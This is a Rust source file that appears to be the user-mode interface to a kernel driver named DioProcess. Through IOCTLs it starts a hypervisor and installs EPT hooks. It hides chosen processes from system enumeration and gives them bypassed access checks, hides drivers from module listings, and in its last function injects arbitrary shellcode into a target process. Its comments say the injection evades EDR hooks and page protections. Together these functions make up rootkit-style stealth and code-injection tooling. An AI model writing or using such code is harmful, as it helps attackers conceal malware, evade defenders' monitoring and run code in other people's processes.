//! Hypervisor control and process protection module
//!
//! This module provides communication with the DioProcess kernel driver
//! for hypervisor (ring -1) control and EPT-based process protection.

use crate::error::CallbackError;
use std::ffi::c_void;
use std::mem::size_of;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::IO::DeviceIoControl;
use windows::core::PCWSTR;

// IOCTL codes - must match DioProcessCommon.h
const FILE_DEVICE_UNKNOWN: u32 = 0x22;
const METHOD_BUFFERED: u32 = 0;
const FILE_ANY_ACCESS: u32 = 0;

const fn ctl_code(device_type: u32, function: u32, method: u32, access: u32) -> u32 {
    (device_type << 16) | (access << 14) | (function << 2) | method
}

const IOCTL_DIOPROCESS_HV_START: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x820, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_STOP: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_PING: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_INSTALL_HOOKS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x823, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_REMOVE_HOOKS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x824, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_PROTECT_PROCESS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x830, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_UNPROTECT_PROCESS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x831, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_IS_PROCESS_PROTECTED: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x832, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_LIST_PROTECTED: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x833, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_HIDE_DRIVER: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x834, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_UNHIDE_DRIVER: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x835, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_IS_DRIVER_HIDDEN: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x836, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_REMOVE_HIDDEN_DRIVER: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x837, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_CLEAR_HIDDEN_DRIVERS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x838, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_LIST_HIDDEN_DRIVERS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x839, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_DIOPROCESS_HV_INJECT_SHELLCODE: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x840, METHOD_BUFFERED, FILE_ANY_ACCESS);

const MAX_HIDDEN_DRIVERS: usize = 16;

const MAX_HV_PROTECTED_PIDS: usize = 64;

/// Device path for the DioProcess driver
const DEVICE_PATH: &str = "\\\\.\\DioProcess\0";

/// Response from HV_PING - hypervisor status
#[repr(C)]
#[derive(Debug, Clone, Default)]
pub struct HvStatus {
    pub is_running: bool,
    pub hooks_installed: bool,
    pub protected_process_count: u32,
}

/// Request for HV_PROTECT_PROCESS / HV_UNPROTECT_PROCESS
#[repr(C)]
struct HvProtectProcessRequest {
    process_id: u32,
}

/// Response for HV_IS_PROCESS_PROTECTED
#[repr(C)]
struct HvIsProtectedResponse {
    is_protected: u8, // BOOLEAN
}

/// Response for HV_LIST_PROTECTED
#[repr(C)]
struct HvListProtectedResponse {
    count: u32,
    pids: [u32; MAX_HV_PROTECTED_PIDS],
}

/// Open a handle to the DioProcess driver
fn open_driver() -> Result<HANDLE, CallbackError> {
    let device_path: Vec<u16> = DEVICE_PATH.encode_utf16().collect();

    let handle = unsafe {
        CreateFileW(
            PCWSTR(device_path.as_ptr()),
            0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )
    };

    match handle {
        Ok(h) => {
            if h.is_invalid() {
                Err(CallbackError::DriverNotFound)
            } else {
                Ok(h)
            }
        }
        Err(_) => Err(CallbackError::DriverNotFound),
    }
}

/// Start the hypervisor (virtualize the system)
pub fn hv_start() -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let mut bytes_returned: u32 = 0;
    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_START,
            None,
            0,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Stop the hypervisor (devirtualize the system)
pub fn hv_stop() -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let mut bytes_returned: u32 = 0;
    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_STOP,
            None,
            0,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Check hypervisor status
pub fn hv_ping() -> Result<HvStatus, CallbackError> {
    let handle = open_driver()?;

    #[repr(C)]
    struct HvPingResponse {
        is_running: u8,    // BOOLEAN
        hooks_installed: u8,
        protected_process_count: u32,
    }

    let mut response = HvPingResponse {
        is_running: 0,
        hooks_installed: 0,
        protected_process_count: 0,
    };
    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_PING,
            None,
            0,
            Some(&mut response as *mut _ as *mut c_void),
            size_of::<HvPingResponse>() as u32,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(HvStatus {
            is_running: response.is_running != 0,
            hooks_installed: response.hooks_installed != 0,
            protected_process_count: response.protected_process_count,
        })
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Check if hypervisor is running
pub fn hv_is_running() -> bool {
    match hv_ping() {
        Ok(status) => status.is_running,
        Err(_) => false,
    }
}

/// Install EPT protection hooks
pub fn hv_install_hooks() -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let mut bytes_returned: u32 = 0;
    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_INSTALL_HOOKS,
            None,
            0,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Remove EPT protection hooks
pub fn hv_remove_hooks() -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let mut bytes_returned: u32 = 0;
    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_REMOVE_HOOKS,
            None,
            0,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Add a process to the hypervisor protection list
/// Protected processes will be hidden from NtQuerySystemInformation
/// and have bypassed access checks via ObReferenceObjectByHandleWithTag
pub fn hv_protect_process(pid: u32) -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let request = HvProtectProcessRequest { process_id: pid };
    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_PROTECT_PROCESS,
            Some(&request as *const _ as *const c_void),
            size_of::<HvProtectProcessRequest>() as u32,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Remove a process from the hypervisor protection list
pub fn hv_unprotect_process(pid: u32) -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let request = HvProtectProcessRequest { process_id: pid };
    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_UNPROTECT_PROCESS,
            Some(&request as *const _ as *const c_void),
            size_of::<HvProtectProcessRequest>() as u32,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Check if a process is in the hypervisor protection list
pub fn hv_is_process_protected(pid: u32) -> Result<bool, CallbackError> {
    let handle = open_driver()?;

    let request = HvProtectProcessRequest { process_id: pid };
    let mut response = HvIsProtectedResponse { is_protected: 0 };
    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_IS_PROCESS_PROTECTED,
            Some(&request as *const _ as *const c_void),
            size_of::<HvProtectProcessRequest>() as u32,
            Some(&mut response as *mut _ as *mut c_void),
            size_of::<HvIsProtectedResponse>() as u32,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(response.is_protected != 0)
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Get list of all protected process IDs
pub fn hv_list_protected() -> Result<Vec<u32>, CallbackError> {
    let handle = open_driver()?;

    let mut response = HvListProtectedResponse {
        count: 0,
        pids: [0; MAX_HV_PROTECTED_PIDS],
    };
    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_LIST_PROTECTED,
            None,
            0,
            Some(&mut response as *mut _ as *mut c_void),
            size_of::<HvListProtectedResponse>() as u32,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        let count = response.count as usize;
        Ok(response.pids[..count].to_vec())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

// ============== Driver Hiding Functions ==============

/// Request to hide a driver
#[repr(C)]
struct HideDriverRequest {
    driver_name: [u8; 64],
}

/// Response for driver hidden status
#[repr(C)]
struct DriverHiddenResponse {
    is_hidden: u8, // BOOLEAN
    hidden_count: u32,
}

/// Response for listing hidden drivers
#[repr(C)]
struct HiddenDriverListResponse {
    count: u32,
    driver_names: [[u8; 64]; MAX_HIDDEN_DRIVERS],
}

/// Enable driver hiding for a specific driver
/// The driver will be hidden from SystemModuleInformation enumeration
pub fn hv_hide_driver(driver_name: &str) -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let mut request = HideDriverRequest {
        driver_name: [0; 64],
    };

    // Copy driver name (truncate if too long)
    let bytes = driver_name.as_bytes();
    let len = bytes.len().min(63);
    request.driver_name[..len].copy_from_slice(&bytes[..len]);

    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_HIDE_DRIVER,
            Some(&request as *const _ as *const c_void),
            size_of::<HideDriverRequest>() as u32,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Disable driver hiding
pub fn hv_unhide_driver() -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_UNHIDE_DRIVER,
            None,
            0,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Check if driver hiding is enabled and get count
pub fn hv_is_driver_hidden() -> Result<(bool, u32), CallbackError> {
    let handle = open_driver()?;

    let mut response = DriverHiddenResponse { is_hidden: 0, hidden_count: 0 };
    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_IS_DRIVER_HIDDEN,
            None,
            0,
            Some(&mut response as *mut _ as *mut c_void),
            size_of::<DriverHiddenResponse>() as u32,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok((response.is_hidden != 0, response.hidden_count))
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Remove a specific driver from the hidden list
pub fn hv_remove_hidden_driver(driver_name: &str) -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let mut request = HideDriverRequest {
        driver_name: [0; 64],
    };

    let bytes = driver_name.as_bytes();
    let len = bytes.len().min(63);
    request.driver_name[..len].copy_from_slice(&bytes[..len]);

    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_REMOVE_HIDDEN_DRIVER,
            Some(&request as *const _ as *const c_void),
            size_of::<HideDriverRequest>() as u32,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Clear all hidden drivers
pub fn hv_clear_hidden_drivers() -> Result<(), CallbackError> {
    let handle = open_driver()?;

    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_CLEAR_HIDDEN_DRIVERS,
            None,
            0,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(())
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

/// Get list of all hidden drivers
pub fn hv_list_hidden_drivers() -> Result<Vec<String>, CallbackError> {
    let handle = open_driver()?;

    let mut response = HiddenDriverListResponse {
        count: 0,
        driver_names: [[0; 64]; MAX_HIDDEN_DRIVERS],
    };
    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_LIST_HIDDEN_DRIVERS,
            None,
            0,
            Some(&mut response as *mut _ as *mut c_void),
            size_of::<HiddenDriverListResponse>() as u32,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        let mut drivers = Vec::new();
        for i in 0..response.count as usize {
            let name_bytes = &response.driver_names[i];
            let len = name_bytes.iter().position(|&b| b == 0).unwrap_or(64);
            if let Ok(name) = std::str::from_utf8(&name_bytes[..len]) {
                drivers.push(name.to_string());
            }
        }
        Ok(drivers)
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}

// ============== Ring -1 Injection Functions ==============

/// Response for ring -1 shellcode injection
#[derive(Debug, Clone)]
pub struct HvInjectResult {
    /// Address where shellcode was written
    pub allocated_address: u64,
    /// Bytes written via ring -1
    pub bytes_written: u64,
    /// Whether injection succeeded
    pub success: bool,
}

/// Response struct matching C structure
#[repr(C)]
struct HvInjectShellcodeResponse {
    allocated_address: u64,
    bytes_written: u64,
    success: u8, // BOOLEAN
}

/// Inject shellcode into a process via ring -1 (hypervisor level)
///
/// This bypasses all ring 0 protections including:
/// - Copy-on-write
/// - EDR hooks on memory operations
/// - Page protection checks
///
/// The injection flow:
/// 1. Allocates RWX memory in target process (ring 0)
/// 2. Writes shellcode via hypervisor (ring -1) - invisible to ring 0
/// 3. Creates remote thread to execute (ring 0)
///
/// Requirements:
/// - Hypervisor must be running (call hv_start() first)
/// - Target process must exist
pub fn hv_inject_shellcode(pid: u32, shellcode: &[u8]) -> Result<HvInjectResult, CallbackError> {
    if shellcode.is_empty() {
        return Err(CallbackError::InvalidParameter);
    }

    let handle = open_driver()?;

    // Build request with variable-length shellcode
    let request_size = 8 + shellcode.len(); // 4 (pid) + 4 (size) + shellcode
    let mut request_buffer = vec![0u8; request_size];

    // Write PID (offset 0)
    request_buffer[0..4].copy_from_slice(&pid.to_le_bytes());
    // Write shellcode size (offset 4)
    request_buffer[4..8].copy_from_slice(&(shellcode.len() as u32).to_le_bytes());
    // Write shellcode (offset 8)
    request_buffer[8..].copy_from_slice(shellcode);

    let mut response = HvInjectShellcodeResponse {
        allocated_address: 0,
        bytes_written: 0,
        success: 0,
    };
    let mut bytes_returned: u32 = 0;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_HV_INJECT_SHELLCODE,
            Some(request_buffer.as_ptr() as *const c_void),
            request_size as u32,
            Some(&mut response as *mut _ as *mut c_void),
            size_of::<HvInjectShellcodeResponse>() as u32,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    if result.is_ok() {
        Ok(HvInjectResult {
            allocated_address: response.allocated_address,
            bytes_written: response.bytes_written,
            success: response.success != 0,
        })
    } else {
        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
    }
}
